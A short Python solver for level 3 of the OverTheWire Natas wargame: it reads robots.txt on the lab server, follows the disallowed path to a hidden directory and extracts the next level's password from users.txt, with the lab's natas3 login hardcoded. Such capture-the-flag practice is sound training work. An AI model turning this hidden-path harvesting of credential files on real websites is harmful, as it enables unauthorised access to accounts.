import requests
import re

def flag(url,username,password):
    site = requests.get(url + "robots.txt",auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit() 
    secret = re.findall("Disallow: (.*)",site.text)
    secret_page = requests.get(url + secret[0].strip(),auth=(username,password))
    users_file = re.findall('<a href="users.txt">(.*)</a>',secret_page.text)
    users = requests.get(url + secret[0] + users_file[0],auth=(username,password))
    flag = re.findall('natas4:(.*)',users.text)
    print("The flag for natas3 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas3.natas.labs.overthewire.org/"
    username = "natas3"
    password = "G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q"
    flag(url,username,password)
